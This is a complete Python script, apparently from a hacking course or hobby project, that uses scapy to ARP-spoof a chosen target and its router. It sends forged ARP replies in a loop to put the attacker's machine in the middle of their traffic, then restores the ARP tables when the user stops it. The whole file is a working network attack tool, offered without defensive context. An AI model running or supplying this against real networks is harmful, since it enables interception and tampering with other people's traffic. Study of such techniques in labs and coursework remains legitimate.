#!  /usr/bin/env python

# use this script with Python 3 !!!!!
import scapy.all as scapy
import time
import optparse
import subprocess


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip) 
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=3, verbose=False)[0]
    return answered_list[0][1].hwsrc


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    restore_packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(restore_packet, count=4, verbose=False)
    # count =4 is for sending this packet for 4 times to make sure device gets it .


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="targets_ip", help="IP address of target device")
    parser.add_option("-r", "--router", dest="router_ip", help="IP address of target router")
    (options, arguments) = parser.parse_args()
    if not options.targets_ip:
        parser.error("\n[-] Please specify targets IP address. Type --help for more info")
    elif not options.router_ip:
        parser.error("\n[-] Please specify routers IP address. Type --help for more info")
    else:
        return options


# subprocess.run(["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"])
# subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=true)
device_ips = get_arguments()
target_ip = device_ips.targets_ip
gateway_ip = device_ips.router_ip
sent_packets_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Packets sent :" + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ... Resetting the ARP tables.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
